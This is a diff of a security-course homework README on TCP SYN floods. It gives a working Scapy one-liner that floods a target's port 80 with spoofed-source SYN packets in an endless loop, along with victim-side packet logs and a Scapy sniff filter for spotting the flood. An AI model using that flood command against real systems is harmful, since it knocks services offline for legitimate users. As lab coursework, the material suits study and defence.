@@ -1,8 +1,8 @@
 # MIE-SIB. Homework #1. 
 
-### Theoretical overview
+### 1, TCP/SYN Packet (TCP/SYN Flood)
 
-###### TCP/SYN Packet (TCP/SYN Flood)
+###### Theoretical overview
 
 A **SYN flood** is a form of denial-of-service attack in which an attacker sends a succession of SYN requests to a target's system in an attempt to consume enough server resources to make the system unresponsive to legitimate traffic.
 
@@ -23,9 +23,7 @@ The server will wait for the acknowledgement for some time, as simple network co
 ![SYN Flood](http://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Tcp_synflood.png/220px-Tcp_synflood.png)
 
 
-### 1. Using Scapy for performing attacks.
-
-###### TCP/SYN Flood.
+###### Using Scapy for performing attacks.
 
 	send(IP(src=RandIP('10.0.0.0/8'), dst='172.16.16.16')/TCP(sport=RandShort(), dport=80), loop=1) 
 
@@ -51,16 +49,10 @@ On the victim router, we can see that the TCP connection queue is immediately ex
 	02:15:49.025861 IP 10.150.235.34.29320 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
 	02:15:49.027553 IP 10.231.145.11.58377 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
 	02:15:49.029261 IP 10.145.105.136.60844 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
-
-###### ARP Poisoning.
-
 	
-### 2. Using Scapy for detecting attacks.
-
-###### TCP/SYN Flood.
+###### Using Scapy for monitoring attacks.
 
 We can easily capture **tcp** packets with **"S" flag**:
-
 
 	a= sniff(filter="tcp[tcpflags] & (tcp-syn) != 0")
 	a.nsummary()
@@ -81,4 +73,4 @@ Displayed information:
 	0011 Ether / IP / TCP 10.73.11.92:55115 > 172.16.16.16:www S
 	0012 Ether / IP / TCP 10.115.49.253:23161 > 172.16.16.16:www S
 
-###### ARP Poisoning.
+### 2, ARP Poisoning.
